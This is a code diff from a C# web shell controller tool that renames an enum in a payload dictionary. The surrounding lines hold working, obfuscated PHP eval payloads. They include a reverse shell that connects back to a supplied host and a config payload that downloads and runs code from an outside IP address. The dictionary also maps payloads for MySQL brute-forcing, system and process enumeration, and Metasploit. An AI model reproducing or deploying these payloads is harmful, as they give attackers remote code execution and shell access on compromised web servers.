@@ -132,17 +132,17 @@ namespace C2.Business.CastleBravo.WebShellTool
         public static string ReverseShellPayload = "{0}=@eval/*AbasBwwevC*/(base64_decode(base64_decode($_REQUEST[0])));&0=WlhKeWIzSmZjbVZ3YjNKMGFXNW5LRVZmUlZKU1QxSWdmQ0JGWDFCQlVsTkZLVHRBYzJWMFgzUnBiV1ZmYkdsdGFYUW9NQ2s3RFFva2IzTTlVRWhRWDA5VE93MEthV1lvYVhOelpYUW9KRjlRVDFOVVd6RmRLU1ltYVhOelpYUW9KRjlRVDFOVVd6SmRLU2tOQ25za2NHOXlkRDBrWDFCUFUxUmJNVjA3RFFva2FYQTlZbUZ6WlRZMFgyUmxZMjlrWlNna1gxQlBVMVJiTWwwcE93MEtKR1p3UFdaemIyTnJiM0JsYmlna2FYQWdMQ0FrY0c5eWRDQXNJQ1JsY25KdWJ5d2dKR1Z5Y25OMGNpazdEUXBwWmlBb0lTUm1jQ2w3RFFva2NtVnpkV3gwSUQwZ0lrNXZkQ0JqYjI1dVpXTjBhVzl1SWpzTkNuME5DbVZzYzJVZ2V3MEtabkIxZEhNZ0tDUm1jQ0FzSWx4dUtrOVRPaUl1Skc5ekxpSXVJRU52Ym01bFkzUWdjM1ZqWTJWemN5RXFYRzRpS1RzTkNuZG9hV3hsS0NGbVpXOW1LQ1JtY0NrcGV5QU5DbVp3ZFhSeklDZ2tabkFzSWlCemFHVnNiRG9nSWlrN0RRb2tjbVZ6ZFd4MFBTQm1aMlYwY3lBb0pHWndMQ0EwTURrMktUc05DaVJ0WlhOellXZGxQV0FrY21WemRXeDBZRHNOQ21ad2RYUnpJQ2drWm5Bc0lpMHRQaUFpTGlSdFpYTnpZV2RsTGlKY2JpSXBPeUI5RFFwbVkyeHZjMlVnS0NSbWNDazdmWDA9&1={1}&2={2}";
         public static string WebConfigPathPayload = "{0}=@eval/*ABC*/(base64_decode(base64_decode($_REQUEST[0])));&0=YzJWemMybHZibDl6ZEdGeWRDZ3BPdzBLYVdZb1pXMXdkSGtvSkY5VFJWTlRTVTlPV3lkamNYbDJjVUpqYjI0eEoxMHBLUTBLZXlSZlUwVlRVMGxQVGxzblkzRjVkbkZDWTI5dU1TZGRQV1pwYkdWZloyVjBYMk52Ym5SbGJuUnpLQ0pvZEhSd09pOHZNVEF6TGpRekxqRTNMamt2ZDJzdlkyOXVaaTVuYVdZaUtUdDlEUXBBWlhaaGJDaG5lbWx1Wm14aGRHVW9KRjlUUlZOVFNVOU9XeWRqY1hsMmNVSmpiMjR4SjEwcEtUcz0=";
         public static string WebConfigFieldPayload = "{0}=@eval/*ABC*/(base64_decode(base64_decode($_REQUEST[0])));&0=YzJWemMybHZibDl6ZEdGeWRDZ3BPdzBLYVdZb1pXMXdkSGtvSkY5VFJWTlRTVTlPV3lkamNYbDJjVUpqYjI0eEoxMHBLUTBLZXlSZlUwVlRVMGxQVGxzblkzRjVkbkZDWTI5dU1TZGRQV1pwYkdWZloyVjBYMk52Ym5SbGJuUnpLQ0pvZEhSd09pOHZNVEF6TGpRekxqRTNMamt2ZDJzdlkyOXVaaTVuYVdZaUtUdDlEUXBBWlhaaGJDaG5lbWx1Wm14aGRHVW9KRjlUUlZOVFNVOU9XeWRqY1hsMmNVSmpiMjR4SjEwcEtUcz0=&1={1}";
-        public static Dictionary<InfoType, string> InfoPayloadDict = new Dictionary<InfoType, string>
+        public static Dictionary<SGType, string> InfoPayloadDict = new Dictionary<SGType, string>
                                            {
-                                             {InfoType.MysqlBlasting, MysqlPayload },
-                                             {InfoType.SystemInfo, SystemInfoPayload },
-                                             {InfoType.ProcessView, ProcessViewPayload },
-                                             {InfoType.ScheduleTask, ScheduleTaskPayload },
-                                             {InfoType.LocationInfo, LocationPayload },
-                                             {InfoType.MSF, MSFPayload},
-                                             {InfoType.WebConfigPath, WebConfigPathPayload},
-                                             {InfoType.MysqlProbe, WebConfigFieldPayload},
-                                             {InfoType.NC, ReverseShellPayload} };
+                                             {SGType.MysqlBlasting, MysqlPayload },
+                                             {SGType.SystemInfo, SystemInfoPayload },
+                                             {SGType.ProcessView, ProcessViewPayload },
+                                             {SGType.ScheduleTask, ScheduleTaskPayload },
+                                             {SGType.LocationInfo, LocationPayload },
+                                             {SGType.MSF, MSFPayload},
+                                             {SGType.WebConfigPath, WebConfigPathPayload},
+                                             {SGType.MysqlProbe, WebConfigFieldPayload},
+                                             {SGType.NC, ReverseShellPayload} };
         /*<--静态变量赋值先后顺序不能改变-->*/
         public static List<string> BDLocationAK = new List<string>()
                                                   {
